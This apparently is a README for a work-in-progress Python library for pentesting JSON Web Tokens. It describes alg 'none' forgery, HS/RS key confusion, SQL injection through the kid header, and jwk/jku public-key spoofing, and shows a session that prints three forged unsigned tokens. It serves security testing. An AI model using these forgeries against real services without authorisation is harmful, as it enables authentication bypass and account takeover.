# PentestJWT - WORK IN PROGRESS !!

Small and simple library for JWTS, only use cases found to be useful are added. Performs simple operations on JWT:
- decodes and encodes JWTs
  - compute signatures (currently only for most common algorithmns, HSxxx and RSxxx)
- generate variations of the provided JWT for most common tests:
  - None signature
  - Signature deception, set alg to HSxxx and signs using contents of file
  - Payload injection in kid, given a test payload, eg, for SQLi, injects the payload in the kid header field. Currently a new signature is not generated
  - Public key deception using JWK: when a private key is provided, the JWT header is modified to include the corresponding public key in the jwk field. JWT signature is updated using the provided private key so the signature can be verified using the public key added as jwk header field.
  - Public key deception using JKU: when a private key and a url (jku url) is provided, the JWT header is modified to include a jku field pointing to the provided jku url. JWT signature is updated using the provided private key. The payload generated, in addition to the token, contains a JWKS representation of the public key. When such JWKS is returned by the url provided as jku url, the signature can be verified. 

Only Python3 supported !

## Inspect and verify JWT signature
Decode a JWT:
```bash
python3 TestJWT.py jwt_token 
```
Decode a JWT and verify HSxxx signature (as stated in _alg_ header field) using provided secret:
```bash
python3 TestJWT.py jwt_token -s=secret 
```
Decode a JWT and verify RSxxx signature (as stated in _alg_ header field) using provided RSA Public Key in a PEM file:
```bash
python3 TestJWT.py jwt_token -p=path_to_pubkey_pem_file 
```
Decode a JWT and verify RSxxx signature (as stated in _alg_ header field) using provided RSA Public Key in a JWKS file:
```bash
python3 TestJWT.py jwt_token -jwks=path_to_jwks_file 
```
## Pentesting JWTs
Meanwhile, have a look at _Attack.py_ and just write your own script or import the lib in a python interpreter.
```bash
ser_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.\
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
from Attack import Attack
attack = Attack(ser_jwt)
attack.attack_none()
Computing signature for alg none
Computing signature for alg None
Computing signature for alg NONE
attack.print_payloads()
```
And the payloads are printed
```
#attack_alg_none
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
#attack_alg_None
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
#attack_alg_NONE
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```
## Installation
*TODO* dependency management
